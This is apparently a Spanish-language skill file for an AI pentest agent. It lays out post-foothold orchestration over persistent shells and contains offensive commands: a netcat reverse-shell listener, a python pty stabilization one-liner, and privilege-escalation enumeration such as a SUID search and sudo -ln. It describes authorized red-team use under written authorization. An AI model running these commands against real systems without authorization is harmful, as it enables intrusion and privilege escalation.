---
name: post-foothold-active
description: "Post-foothold orchestration over a persistent interactive shell (shell_session_*). Activable SOLO con keywords fuertes — requiere foothold ya obtenido con autorización escrita."
triggers:
  tech: []
  ports: []
  keywords:
    # Keywords ESPECÍFICOS (patrón F203.V) — NO "shell" / "post-exploit"
    # genéricos, que matchearían demasiado.
    - "active post-exploit pentest"
    - "post-foothold pentest"
    - "pentest activo post-explotacion"
    - "fire shell session"
    - "interactive shell session"
    - "stabilize reverse shell"
priority: 3
required_tools:
  - run_command
  # Persistent interactive shell tools — only present under KRYON_RED_TEAM.
  - shell_session_start
  - shell_session_input
  - shell_session_output
  - shell_session_close
  - shell_session_list
---

# Post-Foothold Orchestration

**⚠️ ACTIVA SOLO con un foothold YA obtenido y autorización escrita.** Esta
skill asume que un vector previo (RCE, file upload, deserialization, SSRF→RCE)
ya te dio ejecución de comandos en el target. Su trabajo es **estabilizar y
pilotear una shell interactiva persistente** para encadenar enumeración
post-explotación, en vez de re-disparar `run_command` one-shot cada turno.

## Cuándo activar

Cuando el operator pide explícitamente post-explotación o estabilizar una
shell, y ya hay foothold. Ejemplos:
- `kryon investigate "active post-exploit pentest contra <target>" --active`
- `kryon investigate "stabilize reverse shell en <target>"`

NO se activa para recon ni para detección de vulnerabilidades — solo cuando ya
existe ejecución de comandos confirmada.

## Las tools de sesión

Una shell interactiva persistente (a diferencia de `run_command`, que es
one-shot) mantiene estado entre comandos: directorio actual, variables, y un
proceso vivo (listener, intérprete, o shell reversa entrante).

- `shell_session_start(command)` → arranca la sesión y devuelve su id. Ej:
  `shell_session_start("nc -lvnp 4444")` para esperar una shell reversa, o
  `shell_session_start("/bin/sh -i")` para un intérprete local.
- `shell_session_input(session_id, data)` → manda una línea a la sesión.
- `shell_session_output(session_id, clear=True)` → lee el output bufferizado
  (pasá `clear=False` para espiar sin consumir).
- `shell_session_list()` → lista las sesiones activas.
- `shell_session_close(session_id)` → termina la sesión y libera recursos.

## Chain post-foothold (shape mínima)

1. **Abrir/recibir la shell** — `shell_session_start("nc -lvnp 4444")` y luego,
   desde el foothold, gatillar la conexión reversa. Confirmá con
   `shell_session_output(<id>)` que llegó el prompt.
2. **Estabilizar TTY** — mandá por `shell_session_input`:
   `python3 -c 'import pty; pty.spawn("/bin/bash")'`, luego `export TERM=xterm`.
   Una TTY real evita que comandos interactivos (sudo, ssh) se cuelguen.
3. **Enumerar contexto** — `id; whoami; hostname; uname -a` para fijar usuario y
   host. Pegá la línea `uid=...` como evidencia de foothold.
4. **Buscar escalada (read-only)** — `sudo -ln`, `find / -perm -4000 -type f 2>/dev/null`,
   `cat /etc/crontab`, `ls -la /home`. Son lecturas: identifican el camino de
   privesc sin ejecutarlo todavía.
5. **Cerrar** — `shell_session_close(<id>)` al terminar para no dejar listeners
   colgados.

**Regla**: NO emitas resumen final hasta tener al menos el paso 3 (`uid=`
confirmado sobre la sesión). Si tras 4 turns no progresás, emití
operator-input request en lugar de resumen prematuro.

## Banca-safe

- Las tools `shell_session_*` están en el toolset SOLO bajo `KRYON_RED_TEAM`
  (perfil de pentest activo, autorización escrita). El perfil de
  compliance/banca nunca las ve.
- Esta skill NO obtiene el foothold — asume uno previo, autorizado. La
  enumeración del chain es read-only; cualquier acción de escalada efectiva es
  un paso explícito posterior, ROE-gated.
- Cerrá siempre las sesiones (`shell_session_close`): un `nc -lvnp` colgado es
  ruido y superficie innecesaria en el host del operator.
